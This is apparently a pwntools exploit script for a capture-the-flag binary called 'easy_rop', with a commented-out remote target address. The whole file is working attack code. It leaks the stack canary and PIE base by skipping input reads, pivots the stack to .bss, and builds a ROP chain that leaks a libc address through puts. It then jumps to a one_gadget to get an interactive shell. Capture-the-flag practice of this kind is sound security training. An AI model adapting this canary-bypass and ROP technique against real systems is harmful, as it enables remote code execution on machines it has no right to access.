from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
prog = './easy_rop'
elf = ELF(prog)
p = process(prog)
#p = remote("139.129.76.65", 50002)
def debug(addr, sh,PIE=True): 
	io = sh 
	if PIE: 
		proc_base = p.libs()[p.cwd + p.argv[0].strip('.')] 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16) 
		gdb.attach(io,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(io,"b *{}".format(hex(addr)))
for i in range(26):
	p.sendlineafter(": ", '-')
debug(0xb32, p)
p.sendlineafter(": ", '-')
p.recvuntil("number 26 = ")
canary1 = int(p.recvline(), 10)
if canary1 < 0:
	canary1 = (-canary1^0xffffffff)+1
p.sendlineafter(": ", '-')
p.recvuntil("number 27 = ")
canary2 = int(p.recvline(), 10)
if canary2 < 0:
	canary2 = (-canary2^0xffffffff)+1
canary = (canary2<<32)+canary1
print hex(canary)
p.sendlineafter(": ", '-')
p.recvuntil("number 28 = ")
pie1 = int(p.recvline(), 10)
if pie1 < 0:
	pie1 = (-pie1^0xffffffff)+1
p.sendlineafter(": ", '-')
p.recvuntil("number 29 = ")
pie2 = int(p.recvline(), 10)
if pie2 < 0:
	pie2 = (-pie2^0xffffffff)+1
pie = (pie2<<32)+pie1 - 2880
print hex(pie)
p.sendlineafter(": ", str((pie +0x8a0)&0xffffffff))#30
p.sendlineafter(": ", str((pie +0x8a0)>>32))#31
p.sendlineafter(": ", '-')
p.sendlineafter(": ", '-')
p.sendlineafter("What's your name?\n", '111')
for i in range(28):
	p.sendlineafter(": ", '-')
bss = pie + 0x201420
p.sendlineafter(": ", str((bss)&0xffffffff))#28
p.sendlineafter(": ", str(bss >> 32))#29 
p.sendlineafter(": ", str((pie +0xb31)&0xffffffff))#30
p.sendlineafter(": ", str((pie +0xb31)>>32))#31
p.sendlineafter(": ", '-')
p.sendlineafter(": ", '-')
pop_rdi = pie + 0x0000000000000ba3
pop6_ret = pie + 0x0000000000000b9a
payload = p64(pie+0xb31)+p64(pop_rdi)+p64(elf.got['puts']+pie)+p64(elf.plt['puts']+pie)
payload += p64(pop6_ret)+p64(0)+p64(1)+p64(elf.got['read']+pie)+p64(0x100)+p64(bss+152)+p64(0)
payload += p64(pie+0xb80)		
p.sendlineafter("What's your name?\n", payload)
libc_base = u64(p.recv(6)+'\x00'*2)-0x6f690
p.sendline(p64(libc_base + 0x4526a))
p.interactive()